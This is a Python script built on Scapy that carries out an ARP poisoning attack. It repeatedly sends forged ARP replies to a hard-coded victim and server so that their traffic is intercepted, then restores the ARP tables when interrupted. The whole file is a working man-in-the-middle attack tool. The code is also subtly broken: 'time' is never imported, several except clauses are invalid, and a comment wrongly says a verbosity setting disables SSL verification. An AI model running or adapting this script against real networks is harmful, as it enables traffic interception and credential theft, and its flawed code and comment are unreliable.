from scapy.all import ARP, send, Ether, conf, sendp
from router_ip_mac import get_router_ip, get_mac
#Disables Scapy's SSL verification
conf.verb = 0
#Forgesand sends the spoofed ARP packages
def poison(target_ip, target_mac, spoof_ip):
    arp_response = ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=target_mac)
    ether = Ether(dst=target_mac)
    package = ether / arp_response
    sendp(package)

#Main function that poisons the target
def ARP_poison():
    try:
        victim_ip = "192.168.2.100"
        server_ip = "192.168.2.102"
        victim_mac = get_mac(victim_ip)
        server_mac = get_mac(server_ip)


        print(f"Target MAC: {victim_mac}, Gateway MAC: {server_mac}")
        print("The victim has been poisoned . . . ")
        while True:
            # Poison the target
            poison(victim_ip, victim_mac, server_ip)
            # Poison the gateway
            poison(server_ip, server_mac, victim_ip)
            time.sleep(2)  # Send every 2 seconds
    except KeyboardInterrupt:
        print("\nRestoring ARP tables. . .")
        send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=server_ip, hwsrc=server_mac), count=4, verbose=False)
        send(ARP(op=2, pdst=server_ip, hwdst=server_mac, psrc=victim_ip, hwsrc=victim_mac), count=4, verbose=False)
        print("\nARP tables restored.")

    except victim_mac is None:
        print("Could not find target MAC")
    except server_mac is None:
        print("Could not find server MAC")
    except server_ip is None:
        print("Could not find server IP")
    except victim_ip is None:
        print("Target IP doesn't exist")
